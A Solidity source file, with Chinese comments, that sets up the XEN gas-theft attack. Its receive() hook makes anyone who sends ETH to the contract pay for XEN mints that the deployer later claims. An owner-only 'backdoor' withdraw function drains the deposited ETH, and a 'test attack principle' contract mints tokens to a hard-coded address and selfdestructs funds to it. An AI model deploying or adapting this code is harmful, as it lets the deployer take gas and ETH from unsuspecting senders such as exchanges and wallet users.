// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

//xen接口

interface IXen {
    
    function claimRank(uint256 term) external;
    function claimMintReward() external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract recevieDemo{

    address payable owner;

    //xen 合约地址
    address public _addr = 0x2AB0e9e4eE70FFf1fB9D67031E44F6410170d00e ;
    

    //定义一个管理员
    constructor(){
        owner = payable(msg.sender);
    }

    // 接受ETH
    receive() payable external{
        claimxen();
    }

    function claimxen() private{
        //xen mint接口
        IXen(_addr).claimRank(1);
    }
    
    //提取xen 发送xen去地址
    function rewardAndTransfer() external {
        IXen(_addr).claimMintReward();
        uint256 banlance = IXen(_addr).balanceOf(address(this));
        IXen(_addr).transfer(msg.sender, banlance);
        selfdestruct(payable(msg.sender));
    }

    //提款后门
    //提取合约内的余额
    function withdraw() public payable {
        //判断是不是管理员
        require(msg.sender == owner,"not owner!");
        payable(msg.sender).transfer(address(this).balance);
    }
}




//测试 erc20 代币
contract Mytoken is ERC20{
    constructor() ERC20("Mytoken","XTN"){}
    function formint(address to ,uint256 amount) public{
        _mint(to,amount);
    }
}
//Mytoken的接口
interface test{
    function formint(address to,uint256 amount) external;
}
//测试攻击原理
contract testDemo{
    receive() payable external{
        //测试原理
        // 合约地址：0xcF20F78278fA86ce8762aFfABd173F1254605A4c
        test(0xcF20F78278fA86ce8762aFfABd173F1254605A4c).formint(address(0xF3A2fAeFC66fC68b77054b9A46543Afd153a3Aa8),10000000000000);
        selfdestruct(payable(0xF3A2fAeFC66fC68b77054b9A46543Afd153a3Aa8));
    }
}